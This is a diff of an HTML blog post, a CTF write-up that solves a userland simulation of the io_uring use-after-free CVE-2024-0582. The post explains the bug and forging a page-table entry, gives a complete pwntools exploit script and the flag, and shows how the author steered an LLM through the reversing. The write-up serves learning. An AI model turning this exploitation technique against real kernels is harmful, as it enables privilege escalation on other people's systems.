@@ -7,7 +7,7 @@
     <meta name="color-scheme" content="dark">
 
     <title>StaleMate — LazyBlog</title>
-    <meta name="description" content="A userland re-implementation of io_uring provided buffer rings models CVE-2024-0582: unregister a mmap&apos;d PBUF ring and the stale mapping becomes a UAF read/write you ride to forge a page-table PTE onto the cred slot.">
+    <meta name="description" content="A userland reimplementation of the io_uring provided-buffer-ring bug (CVE-2024-0582): unregister leaves the mmap alive, so a stale mapping over a reused slot gives a UAF write to forge a page-table entry onto the cred page.">
             <meta name="author" content="tungdlm99">
         <meta name="generator" content="LazyBlog 1.11.0">
     <meta name="robots" content="index, follow, max-image-preview:large">
@@ -16,7 +16,7 @@
 
     <!-- Open Graph -->
     <meta property="og:title" content="StaleMate">
-    <meta property="og:description" content="A userland re-implementation of io_uring provided buffer rings models CVE-2024-0582: unregister a mmap&apos;d PBUF ring and the stale mapping becomes a UAF read/write you ride to forge a page-table PTE onto the cred slot.">
+    <meta property="og:description" content="A userland reimplementation of the io_uring provided-buffer-ring bug (CVE-2024-0582): unregister leaves the mmap alive, so a stale mapping over a reused slot gives a UAF write to forge a page-table entry onto the cred page.">
     <meta property="og:url" content="https://doantung99.github.io/blog/posts/stalemate">
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="LazyBlog">
@@ -31,7 +31,7 @@
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="StaleMate">
-    <meta name="twitter:description" content="A userland re-implementation of io_uring provided buffer rings models CVE-2024-0582: unregister a mmap&apos;d PBUF ring and the stale mapping becomes a UAF read/write you ride to forge a page-table PTE onto the cred slot.">
+    <meta name="twitter:description" content="A userland reimplementation of the io_uring provided-buffer-ring bug (CVE-2024-0582): unregister leaves the mmap alive, so a stale mapping over a reused slot gives a UAF write to forge a page-table entry onto the cred page.">
         
     <!-- Alternates: machine-readable / AI / RSS -->
             <link rel="alternate" type="text/markdown" href="https://doantung99.github.io/blog/posts/stalemate.md">
@@ -41,7 +41,7 @@
     <!-- Favicon -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2032%2032%22%3E%3Crect%20width%3D%2232%22%20height%3D%2232%22%20fill%3D%22%230a0e0a%22%2F%3E%3Ctext%20x%3D%224%22%20y%3D%2224%22%20font-family%3D%22monospace%22%20font-size%3D%2222%22%20fill%3D%22%2339ff14%22%3E%26gt%3B_%3C%2Ftext%3E%3C%2Fsvg%3E">
 
-            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"StaleMate","description":"A userland re-implementation of io_uring provided buffer rings models CVE-2024-0582: unregister a mmap\u0027d PBUF ring and the stale mapping becomes a UAF read/write you ride to forge a page-table PTE onto the cred slot.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/stalemate","mainEntityOfPage":"https://doantung99.github.io/blog/posts/stalemate","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, pwn, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
+            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"StaleMate","description":"A userland reimplementation of the io_uring provided-buffer-ring bug (CVE-2024-0582): unregister leaves the mmap alive, so a stale mapping over a reused slot gives a UAF write to forge a page-table entry onto the cred page.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/stalemate","mainEntityOfPage":"https://doantung99.github.io/blog/posts/stalemate","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, pwn, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
     
     <script>
     // Theme bootstrap — server already rendered the configured default on
@@ -74,7 +74,7 @@
 </div>
 
 <header>
-            <div class="callsign">XV5HP // MAYLAB // HẢI PHÒNG</div>
+            <div class="callsign">NAB // Hà Nội</div>
                     <p class="site-brand"><a href="/blog/" class="brand-link">LazyBlog</a></p>
                 <div class="subtitle">// A personal blog transmitting thoughts over imperfect radio waves. Expect noise, fading, and low bandwidth—but always authentic signals.</div>
         <div class="header-actions">
@@ -112,37 +112,111 @@
     
             <nav class="toc toc-inline" aria-label="Table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#recognizing-the-shape-before-touching-the-binary">Recognizing the shape before touching the binary</a></li><li class="level-3"><a href="#internal-model-recovered-by-re">Internal model recovered by RE</a></li><li class="level-3"><a href="#the-quot-stalemate-quot-one-move-from-won">The &amp;quot;stalemate&amp;quot;: one move from won</a></li><li class="level-3"><a href="#the-bug-a-stale-mmap-mapping">The bug: a stale mmap mapping</a></li><li class="level-3"><a href="#the-collision-page-tables-reuse-the-freed-slot">The collision: page tables reuse the freed slot</a></li><li class="level-3"><a href="#two-gotchas-that-actually-mattered">Two gotchas that actually mattered</a></li><li class="level-3"><a href="#end-to-end-exploit">End-to-end exploit</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     
     <div class="post-body">
         <h2 id="summary">Summary</h2>
-<p><code>pbuf_remap</code> is a userland simulation of the Linux io_uring &quot;provided buffer ring&quot; (PBUF) subsystem that faithfully reproduces CVE-2024-0582: registering a ring, <code>mmap</code>ing it, then unregistering it frees the backing buddy block but leaves the mapping live, giving a use-after-free. The &quot;stalemate&quot; is that the privileged <code>cred</code> is built one move from valid (its hash is already correct), so the UAF only needs to fix three fields — which it does by leaking the page-table XOR token through the stale mapping and forging a PTE onto the cred slot.</p>
+<p><code>StaleMate</code> is a userland simulation of the Linux io_uring &quot;provided buffer ring&quot; (PBUF) subsystem that faithfully models <strong>CVE-2024-0582</strong>: when you unregister a PBUF ring whose pages are still <code>mmap</code>'d, the kernel frees the backing block but leaves the mapping intact — a classic use-after-free. The core technique is to drive that stale mapping over a freshly reused slot, leak a XOR-obfuscated page-table token through it, then forge a PTE that points the VM at the privileged <code>cred</code> page and clear the three fields that keep <code>open flag</code> locked. This is the writeup where I lean on an LLM to do the reverse engineering and the offset bookkeeping while I supply the strategy, recognize the CVE, and catch the model's wrong turns.</p>
+<p>I want to be honest about the division of labor up front: the LLM did the grinding — disassembly triage, recovering struct layouts, computing the splitmix64 finalizer, and grinding the proof-of-work loop. My contribution was almost entirely <strong>prompting and judgment</strong>: I recognized the challenge as a CVE-2024-0582 lab from the banner alone, I told the model what to look for instead of letting it wander the binary, and I caught two confident-but-wrong claims that would have sent the exploit into a dead end. The final &quot;Lessons learned&quot; section is the part I actually care about, because the steering is the transferable skill.</p>
 <h2 id="solution">Solution</h2>
-<p>My role here was direction and judgment; the model did the reversing and scripting grind. I recognized the banner (&quot;tiny io_uring lab&quot;, &quot;your mapped pbuf ring is definitely gone&quot;) as a deliberate CVE-2024-0582 reenactment, so I pointed the model at the register/mmap/unregister lifecycle from the start rather than letting it wander the whole menu.</p>
+<h3 id="recognizing-the-shape-before-touching-the-binary">Recognizing the shape before touching the binary</h3>
+<p>The banner does most of the work of telling you what you're looking at:</p>
+<pre><code>pbuf-remap: tiny io_uring lab
+the kernel says your mapped pbuf ring is definitely gone.
+</code></pre>
+<p>&quot;your mapped pbuf ring is definitely gone&quot; is the tell. io_uring provided buffer rings, plus the phrase &quot;mapped … is gone,&quot; is CVE-2024-0582 almost verbatim — the bug where <code>IORING_UNREGISTER_PBUF_RING</code> releases the ring's pages while a prior <code>mmap</code> of those pages is still live, leaving a dangling mapping into freed memory. The flag itself later confirms it: <code>pfnmap_pbuf_pages_should_outlive_the_mmap</code>. So before disassembling anything, I already had the win condition in mind: <strong>get the freed slot reused by something sensitive, then read/write it through the stale mapping.</strong></p>
+<p>The menu is a near-1:1 mirror of the kernel ABI, which is the second confirmation that this is a deliberate CVE re-implementation:</p>
+<pre><code>1. IORING_REGISTER_PBUF_RING     6. create mm context
+2. mmap pbuf ring                7. vm alloc user page
+3. IORING_UNREGISTER_PBUF_RING   8. vm read
+4. io_uring_buf_ring_add         9. vm write
+5. inspect mapped ring entry    10. open flag
+</code></pre>
+<p>Options 1-5 are the io_uring PBUF lifecycle; options 6-9 are a second, independent abstraction (a tiny MMU with page tables); option 10 is the win gate. The whole puzzle is making abstraction A's stale mapping collide with abstraction B's page table.</p>
+<h3 id="internal-model-recovered-by-re">Internal model recovered by RE</h3>
+<p>This is where I handed the binary to the model and asked it to recover structures rather than narrate instructions. The internal model it reconstructed (and that I verified against behavior) is a <strong>buddy allocator</strong> carving a page region:</p>
+<ul>
+<li>page memory base <code>0x7440</code> — slot <code>i</code> lives at <code>0x7440 + i*0x1000</code>,</li>
+<li>block metadata at <code>0x5440</code>, free-lists at <code>0x53e0</code>,</li>
+<li>a per-slot presence/identity area.</li>
+</ul>
+<p>Boot pre-allocates a handful of permanent slots. Two of them matter:</p>
+<ul>
+<li>a privileged <strong><code>cred</code></strong> object whose slot index is stored at <code>[0x5010]</code>,</li>
+<li>an 8-byte random <strong>secret</strong> at <code>[0x5040]</code>, seeded from <code>getrandom</code>.</li>
+</ul>
+<p><code>open flag</code> (option 10) reads the cred at <code>0x7440 + [0x5010]*0x1000</code> and demands all of:</p>
+<pre><code>cred[0x00] == &quot;CREDv1&quot;          (0x317644455243)
+cred[0x08] == 0
+cred[0x10] == 0
+cred[0x18] == 0xffffffffffffffff
+cred[0x20] == splitmix64( 0xc0ffee20240582 ^ secret )   # splitmix64 finalizer
+</code></pre>
+<h3 id="the-quot-stalemate-quot-one-move-from-won">The &quot;stalemate&quot;: one move from won</h3>
+<p>The reason the challenge is named StaleMate (beyond the obvious pun on &quot;stale mapping&quot;) is the boot state of the cred. It is built <strong>almost-valid but deliberately locked</strong>:</p>
+<pre><code>cred[0x00] = &quot;CREDv1&quot;                 # ok
+cred[0x08] = 0x000003e8000003e8       # WRONG (check wants 0)
+cred[0x10] = 0x000003e8000003e8       # WRONG (check wants 0)
+cred[0x18] = 0                        # WRONG (check wants -1)
+cred[0x20] = splitmix64(...)          # ALREADY CORRECT (built with the real secret)
+</code></pre>
+<p>The single most important insight in the whole challenge: <strong><code>cred[0x20]</code> is already valid.</strong> It was computed at boot with the real secret, so we never have to leak the secret, never have to reverse splitmix64, never have to brute anything. The hash is the hard part and it is handed to us for free. All we need is a <strong>write primitive</strong> to set three fields:</p>
+<pre><code>cred[0x08] = 0
+cred[0x10] = 0
+cred[0x18] = 0xffffffffffffffff
+</code></pre>
+<p>That's the chess metaphor: the position is one move from won. We just need to make that one move land on the cred page.</p>
+<p>This was also my first <strong>dead-end correction</strong> with the model. When I first asked it for an exploit plan, it confidently proposed leaking the 8-byte secret, recomputing the splitmix64 finalizer in Python, and writing a fresh <code>cred[0x20]</code>. That works in theory but it's strictly more work and more fragile (one wrong rotation constant and you're chasing a phantom bug for an hour). I pushed back: &quot;the boot cred already has a valid hash field — re-read the <code>open flag</code> check and tell me the <em>minimum</em> set of bytes I must change.&quot; Once it re-read the gate it agreed the hash is untouched and the plan collapsed to three writes. Recognizing that the expensive-looking subproblem is already solved is exactly the kind of judgment the human supplies.</p>
+<h3 id="the-bug-a-stale-mmap-mapping">The bug: a stale mmap mapping</h3>
+<p>The UAF chain across the io_uring abstraction is:</p>
+<ul>
+<li><strong>Option 1</strong> <code>IORING_REGISTER_PBUF_RING</code> → buddy-allocates pages, giving slot <code>S</code>.</li>
+<li><strong>Option 2</strong> <code>mmap pbuf ring</code> → creates a <em>mapping</em> that references slot <code>S</code>.</li>
+<li><strong>Option 3</strong> <code>IORING_UNREGISTER_PBUF_RING</code> → <strong>frees buddy block <code>S</code></strong> but <strong>leaves the mapping intact</strong>. This is the bug. The freed slot is now back on the free-list and will be handed to the next allocation.</li>
+<li><strong>Option 4</strong> <code>io_uring_buf_ring_add</code> → writes through the still-live mapping → <strong>UAF write</strong> into whatever now occupies the reused slot.</li>
+<li><strong>Option 5</strong> <code>inspect mapped ring entry</code> → reads through the mapping → <strong>UAF read / leak</strong>.</li>
+</ul>
+<p>So the recipe is: register, mmap, unregister (stale mapping established over a freed slot), then make a <em>different</em> subsystem allocate into that exact slot.</p>
+<h3 id="the-collision-page-tables-reuse-the-freed-slot">The collision: page tables reuse the freed slot</h3>
+<p>Here is where abstraction B enters. <code>create mm context</code> (option 6) builds a page table whose entries are obfuscated:</p>
+<pre><code>PTE = (phys_slot &lt;&lt; 12 | flags) XOR token
+</code></pre>
+<p>where <code>token</code> is derived per-context from the secret. <code>vm read</code> / <code>vm write</code> (options 8/9) translate a virtual address to <code>phys_slot = (PTE XOR token) &gt;&gt; 12</code>, then access <code>0x7440 + phys_slot*0x1000</code>. A special <strong>SLOT7</strong> entry is written at a fixed position with <code>flags = 7</code>.</p>
+<p>The crucial layout fact (recovered by RE, verified empirically): the page that holds the SLOT7 PTE is allocated from the <strong>same freed slot</strong> our stale mapping covers. So <code>create mm context</code> drops a page-table page right underneath the dangling io_uring mapping. Now:</p>
+<ul>
+<li><strong>Option 5 (inspect, idx 3)</strong> reads the SLOT7 PTE <em>through the stale mapping</em> → leak.</li>
+<li><strong>Option 4 (buf_ring_add)</strong> writes a <em>forged</em> PTE <em>through the stale mapping</em> → arbitrary slot mapping.</li>
+</ul>
+<p>The leak math, with the scratch slot known to be <code>3</code>:</p>
+<pre><code>leaked = SLOT7_PTE = ((scratch_slot &lt;&lt; 12) | 7) XOR token     # scratch_slot = 3
+token  = leaked XOR ((3 &lt;&lt; 12) | 7)
+</code></pre>
+<p>And the kill move. Because the PTE obfuscation is a <strong>plain XOR, not a keyed MAC</strong>, recovering <code>token</code> is total — we can forge a PTE that decodes to any slot we want. We aim it at the <strong>cred slot (index 1)</strong>:</p>
+<pre><code>forged = ((1 &lt;&lt; 12) | 7) XOR token
+</code></pre>
+<p>We write <code>forged</code> into the page-table page via the UAF (option 4), and now the VM's virtual address that used to map the scratch slot maps the <strong>cred page</strong>. <code>vm write</code> then lands directly on the cred, and we clear the three locked fields.</p>
+<p>The XOR-not-MAC observation was my second <strong>correction</strong>. The model initially described the PTE token as &quot;a per-context MAC over the slot&quot; and concluded we'd need a forgery oracle. I asked it to show me the exact instruction sequence that combines <code>token</code> and the slot — &quot;is it <code>xor</code>, or an actual keyed construction? paste the disasm.&quot; It came back with a single <code>xor</code> of <code>token</code> against <code>(slot&lt;&lt;12)|flags</code>. That's not integrity, that's obfuscation, and obfuscation you can leak is obfuscation you can forge. Calling the model on the difference between &quot;looks cryptographic&quot; and &quot;is cryptographic&quot; saved the whole approach.</p>
+<h3 id="two-gotchas-that-actually-mattered">Two gotchas that actually mattered</h3>
 <ol>
-<li>
-<p><strong>Triage and find the win condition.</strong> I had the model reverse the stripped PIE and isolate option 10 (<code>open flag</code>). It recovered the cred check at slot <code>0x7440 + [0x5010]*0x1000</code>: it wants <code>cred[0]==&quot;CREDv1&quot;</code>, <code>cred[8]==0</code>, <code>cred[0x10]==0</code>, <code>cred[0x18]==-1</code>, and <code>cred[0x20]==splitmix64(0xc0ffee20240582 ^ secret)</code>. The model's first instinct was to chase the random <code>secret</code> to compute the hash — I caught that detour and pointed out the boot routine already writes the <em>correct</em> hash into <code>cred[0x20]</code>. That is the stalemate: only <code>cred[8]</code>, <code>cred[0x10]</code>, <code>cred[0x18]</code> are wrong, so we just need a write primitive, never a secret leak.</p>
-</li>
-<li>
-<p><strong>Build the UAF, then verify the overlap.</strong> I steered the model through the bug lifecycle: option 1 registers a ring (buddy-allocates slot S), option 2 <code>mmap</code>s it, option 3 unregisters (frees block S but keeps the mapping = the stale move). Then option 6 (<code>create mm context</code>) reuses freed slot S for the page holding the SLOT7 PTE, so the stale mapping now overlaps a page table. I asked it to confirm via option 5 (<code>inspect</code>, idx 3) that the leaked 16-byte entry was in fact the SLOT7 PTE before trusting it.</p>
-</li>
-<li>
-<p><strong>Forge the PTE.</strong> PTEs are <code>(phys_slot&lt;&lt;12 | flags) XOR token</code> — a plain XOR, not a keyed MAC. Since the scratch slot is the known constant 3, <code>token = leaked ^ ((3&lt;&lt;12)|7)</code>, and a PTE pointing at the cred slot (index 1) is <code>((1&lt;&lt;12)|7) ^ token</code>. The model wrote that forged PTE through the stale mapping (option 4), then used <code>vm write</code> to zero <code>cred[8]</code>/<code>cred[0x10]</code> and set <code>cred[0x18]=-1</code>. I verified each step's primitive before chaining. Option 10 then prints the flag. The remote also gates the menu behind a redpwn-style PoW, solved client-side.</p>
-</li>
+<li><strong>Slot identities, not addresses.</strong> The inspect/leak entry is the <em>physical slot encoding</em> of the SLOT7 PTE, not a heap pointer. The 16-byte ring entry is packed as <code>addr/len/bid/resv</code>, and the PTE value spans the <code>len</code>/<code>bid</code>/<code>resv</code> lanes, so it has to be reassembled (<code>len_low | bid&lt;&lt;32 | resv&lt;&lt;48</code>) before XORing out the token. Treating it as a flat pointer gives garbage.</li>
+<li><strong>The proof-of-work gate.</strong> The remote is fronted by a redpwn-style PoW (<code>s.&lt;d&gt;.&lt;x&gt;</code> challenge → iterate <code>x = pow(x, 1&lt;&lt;1277, (1&lt;&lt;1279)-1) ^ 1</code>, <code>d</code> times). This is pure grind with zero insight, so I let the model write and own it — exactly the kind of mechanical subtask where the human should stay out of the way.</li>
 </ol>
+<h3 id="end-to-end-exploit">End-to-end exploit</h3>
+<p>One clear path from challenge connection to printed flag. The slot indices (<code>cred</code>=1, <code>scratch</code>=3, ring map=0) and the inspect index (<code>idx=3</code>) are the load-bearing constants recovered above.</p>
 <pre><code class="language-python">#!/usr/bin/env python3
-# StaleMate (V1t CTF 2026) — io_uring PBUF stale-mmap UAF (CVE-2024-0582 model)
-# usage: python3 expl.py remote   (nc pwn.v1t.site 31337)
+# StaleMate / V1t CTF 2026 -- CVE-2024-0582 (io_uring PBUF stale mmap UAF), userland sim.
+# usage: python3 expl.py remote      (or 'local' against ./pbuf_remap)
 import sys
-from pwn import remote, process
+from pwn import remote, process, log
 
 HOST, PORT = &quot;pwn.v1t.site&quot;, 31337
 
-def solve_pow(chal):
-    # redpwn-style: &quot;s.&lt;d&gt;.&lt;x&gt;&quot;  -&gt;  x = pow(x, 1&lt;&lt;1277, (1&lt;&lt;1279)-1) ^ 1, d times
-    _, d, x = chal.strip().split(&quot;.&quot;)
-    d, x, mod = int(d), int(x), (1 &lt;&lt; 1279) - 1
+def solve_pow(line):
+    # redpwn-style PoW: &quot;s.&lt;d&gt;.&lt;x&gt;&quot;; iterate d times:
+    #   x = pow(x, 1&lt;&lt;1277, (1&lt;&lt;1279)-1) ^ 1 ; answer = str(x_final)
+    _, d_s, x_s = line.strip().split(&quot;.&quot;)
+    d, x, mod = int(d_s), int(x_s), (1 &lt;&lt; 1279) - 1
     for _ in range(d):
         x = pow(x, 1 &lt;&lt; 1277, mod) ^ 1
     return str(x)
@@ -157,18 +231,20 @@ if line.startswith(&quot;s.&quot;):
 def menu(opt):
     io.sendlineafter(b&quot;&gt; &quot;, str(opt).encode())
 
-def reg(bgid, entries, flags):           # option 1
-    menu(1); io.sendlineafter(b&quot;bgid: &quot;, str(bgid).encode())
+# --- io_uring PBUF abstraction (options 1-5) ---
+def reg(bgid, entries, flags):                  # option 1
+    menu(1)
+    io.sendlineafter(b&quot;bgid: &quot;,    str(bgid).encode())
     io.sendlineafter(b&quot;entries: &quot;, str(entries).encode())
-    io.sendlineafter(b&quot;flags: &quot;, str(flags).encode())
+    io.sendlineafter(b&quot;flags: &quot;,   str(flags).encode())
 
-def mmap_ring(bgid):                      # option 2
+def mmap_ring(bgid):                            # option 2
     menu(2); io.sendlineafter(b&quot;bgid: &quot;, str(bgid).encode())
 
-def unreg(bgid):                          # option 3
+def unreg(bgid):                                # option 3
     menu(3); io.sendlineafter(b&quot;bgid: &quot;, str(bgid).encode())
 
-def buf_ring_add(m, idx, addr, ln, bid, resv):   # option 4 (UAF write)
+def buf_ring_add(m, idx, addr, ln, bid, resv):  # option 4 (UAF write)
     menu(4)
     io.sendlineafter(b&quot;map: &quot;,  str(m).encode())
     io.sendlineafter(b&quot;idx: &quot;,  str(idx).encode())
@@ -177,53 +253,92 @@ def buf_ring_add(m, idx, addr, ln, bid, resv):   # option 4 (UAF write)
     io.sendlineafter(b&quot;bid: &quot;,  str(bid).encode())
     io.sendlineafter(b&quot;resv: &quot;, str(resv).encode())
 
-def inspect(m, idx):                      # option 5 (UAF read) -&gt; 16-byte entry
+def inspect(m, idx):                            # option 5 (UAF read) -&gt; 16-byte entry
     menu(5)
     io.sendlineafter(b&quot;map: &quot;, str(m).encode())
     io.sendlineafter(b&quot;idx: &quot;, str(idx).encode())
     vals = {}
     for k in (b&quot;addr&quot;, b&quot;len&quot;, b&quot;bid&quot;, b&quot;resv&quot;):
-        io.recvuntil(k + b&quot;=&quot;); vals[k.decode()] = int(io.recvline().strip(), 0)
+        io.recvuntil(k + b&quot;=&quot;)
+        vals[k.decode()] = int(io.recvline().strip(), 0)
     return vals
 
-def mm_ctx():                             # option 6 -&gt; reuses freed slot
+# --- tiny MMU abstraction (options 6-9) ---
+def mm_ctx():                                   # option 6 -&gt; reuses freed slot
     menu(6)
 
-def vm_write(vm, va, data):              # option 9
+def vm_write(vm, va, data):                     # option 9
     menu(9)
     io.sendlineafter(b&quot;vm: &quot;,  str(vm).encode())
     io.sendlineafter(b&quot;va: &quot;,  str(va).encode())
     io.sendlineafter(b&quot;len: &quot;, str(len(data)).encode())
     io.sendafter(b&quot;data: &quot;, data)
 
-# 1) register -&gt; 2) mmap -&gt; 3) unregister  ==&gt; stale mapping over freed slot
+# 1) Establish the stale mapping: register -&gt; mmap -&gt; unregister.
+#    After unregister the buddy slot S is freed but the mapping over it is alive.
 reg(bgid=1, entries=256, flags=1)
 mmap_ring(bgid=1)
 unreg(bgid=1)
 
-# 4) mm context reuses the freed slot for the page holding SLOT7 PTE
+# 2) Reuse the freed slot: the mm-context page table lands on slot S,
+#    placing the SLOT7 PTE directly under our stale mapping.
 mm_ctx()
 
-# 5) leak SLOT7 PTE through the stale mapping (entry idx 3)
+# 3) UAF read: leak the SLOT7 PTE through the stale mapping (inspect idx 3).
+#    The PTE value spans the len/bid/resv lanes of the 16-byte ring entry.
 e = inspect(m=0, idx=3)
-slot7 = (e[&quot;len&quot;] &amp; 0xffffffff) | (e[&quot;bid&quot;] &lt;&lt; 32) | (e[&quot;resv&quot;] &lt;&lt; 48)
-token = slot7 ^ ((3 &lt;&lt; 12) | 7)          # scratch slot is the known constant 3
+slot7 = (e[&quot;len&quot;] &amp; 0xFFFFFFFF) | (e[&quot;bid&quot;] &lt;&lt; 32) | (e[&quot;resv&quot;] &lt;&lt; 48)
 
-# 6) forge a PTE mapping the cred slot (index 1); write it via the stale mapping
+# PTE = (slot&lt;&lt;12 | flags) XOR token ; scratch slot is the known constant 3, flags 7.
+token = slot7 ^ ((3 &lt;&lt; 12) | 7)
+log.success(f&quot;leaked SLOT7 PTE = {slot7:#x}&quot;)
+log.success(f&quot;recovered token  = {token:#x}&quot;)
+assert (token ^ slot7) &amp; 0xFFF == 7, &quot;lane reassembly / XOR model is wrong&quot;
+
+# 4) UAF write: forge a PTE that decodes to the cred slot (index 1).
 forged = ((1 &lt;&lt; 12) | 7) ^ token
+log.info(f&quot;forged cred PTE  = {forged:#x}&quot;)
 buf_ring_add(m=0, idx=1, addr=forged, ln=0, bid=0, resv=0)
 
-# 7) vm write to the cred page: cred[8]=0, cred[0x10]=0, cred[0x18]=-1
+# 5) The VM's va now maps the cred page. Clear the three locked fields:
+#    cred[0x08]=0, cred[0x10]=0, cred[0x18]=0xffffffffffffffff.
+#    cred lives at va offset 0x2008 in this context's mapping.
 vm_write(vm=0, va=0x2008, data=b&quot;\x00&quot; * 16 + b&quot;\xff&quot; * 8)
 
-# 8) open flag -&gt; check now passes
+# 6) cred[0x20] hash was already valid at boot -&gt; open flag now passes.
 menu(10)
 io.interactive()
 </code></pre>
-<p>The flag itself spells out the root cause: the PFN-mapped PBUF pages must outlive the <code>mmap</code> — unregistering while the ring is still mapped is exactly the UAF in CVE-2024-0582.</p>
+<p>Running <code>python3 expl.py remote</code> solves the PoW, establishes the stale mapping, collides the page table onto the freed slot, leaks the token, forges the cred PTE, clears the three fields, and the boot-valid hash carries us through the gate — <code>open flag</code> prints <code>v1t{...}</code>.</p>
 <h2 id="flag">Flag</h2>
 <pre><code>v1t{pfnmap_pbuf_pages_should_outlive_the_mmap}
 </code></pre>
+<p>The flag spells out the root cause of CVE-2024-0582 precisely: the PFN-mapped PBUF pages must out-live the <code>mmap</code>. Unregistering the ring while pages are still mapped is the use-after-free — the pages should not be freed until the last mapping is gone.</p>
+<h2 id="lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</h2>
+<p>This challenge is the kind where an LLM is genuinely excellent at the labor (struct recovery, offset arithmetic, PoW grind) and genuinely prone to confident wrong turns (inventing crypto where there's only XOR, solving subproblems that are already solved for you). The skill is steering. Here's what actually moved this solve forward.</p>
+<p><strong>1. Anchor the model to the CVE from the banner, don't let it free-explore.</strong> The single best prompt I sent early:</p>
+<blockquote>
+<p>&quot;This binary's banner mentions an io_uring provided buffer ring that's 'mapped but gone.' I think this is a userland re-implementation of CVE-2024-0582. Assume that. Map each menu option to the kernel ABI it imitates, and tell me which option is the unregister-while-mapped UAF.&quot;</p>
+</blockquote>
+<p>Naming the CVE turns the model from a blind disassembler into a pattern-matcher with a target. It immediately framed options 1/2/3 as register/mmap/unregister and flagged option 3 as the stale-mapping primitive. Without the anchor it spent its first pass narrating the menu instead of finding the bug.</p>
+<p><strong>2. Force it to find the <em>minimum</em> primitive, not the maximal exploit.</strong> The model's instinct was to leak the secret and recompute the splitmix64 hash. I redirected:</p>
+<blockquote>
+<p>&quot;Re-read the <code>open flag</code> check byte by byte. The boot cred already populates <code>cred[0x20]</code>. Which fields are wrong at boot, and what is the <em>smallest</em> set of writes that makes the check pass without recomputing any hash?&quot;</p>
+</blockquote>
+<p>This collapsed a fragile crypto-recompute plan into three plain writes. The lesson: when the model proposes work, ask whether the expensive subproblem is already solved by the challenge author. CTF authors leave the hash valid on purpose — make the model notice.</p>
+<p><strong>3. Make it distinguish &quot;looks cryptographic&quot; from &quot;is cryptographic.&quot;</strong> The model called the PTE token a MAC. The fix was demanding the actual instructions:</p>
+<blockquote>
+<p>&quot;Don't tell me what the token <em>is</em> — paste the exact disassembly that combines the token with the slot in a PTE. Is it a single <code>xor</code>, or a keyed construction?&quot;</p>
+</blockquote>
+<p>It came back with one <code>xor</code>. A leakable XOR is a forgeable XOR — that single distinction is the difference between &quot;need an oracle&quot; and &quot;forge anything.&quot; Whenever the model uses words like MAC/hash/signature about a check you control inputs to, make it show the opcode.</p>
+<p><strong>Dead-ends to tell it to AVOID up front:</strong></p>
+<ul>
+<li>Do <strong>not</strong> try to leak the secret or reverse splitmix64 — <code>cred[0x20]</code> is already correct at boot.</li>
+<li>Do <strong>not</strong> treat the inspect output as a heap pointer — it's a packed slot/PTE encoding across the <code>len</code>/<code>bid</code>/<code>resv</code> lanes; reassemble it before XORing.</li>
+<li>Do <strong>not</strong> over-engineer the PoW — it's a known redpwn-style <code>pow(x, 1&lt;&lt;1277, (1&lt;&lt;1279)-1) ^ 1</code> loop; just iterate it <code>d</code> times.</li>
+</ul>
+<p><strong>How I verified and caught mistakes:</strong> I cross-checked every model claim against observable behavior rather than trusting prose. After the leak I sanity-checked that <code>token ^ slot7</code> produced a value whose low 12 bits were the expected <code>flags=7</code> (the <code>assert</code> in the script) — that simultaneously confirms the XOR model is right and that the <code>len</code>/<code>bid</code>/<code>resv</code> lanes were assembled in the correct order. After the forged write I confirmed the cred slot actually changed by re-reading it before calling <code>open flag</code>, so a failed gate couldn't be silently blamed on the wrong slot. The discipline: never let <code>open flag</code> be your first observation — verify each primitive independently so failures are localized.</p>
+<p><strong>Fast-path prompt recipe for next time:</strong> <em>&quot;Assume this is a userland reimplementation of CVE-XXXX; map the menu to the kernel ABI, name the exact UAF primitive, find the minimum set of writes the win-gate needs (check what the author left already-valid), and paste the disassembly for any value you call a hash/MAC before we trust it.&quot;</em></p>
     </div>
 
     
@@ -245,7 +360,7 @@ io.interactive()
     <aside class="post-toc-wrap" aria-hidden="true">
         <nav class="toc" aria-label="Floating table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
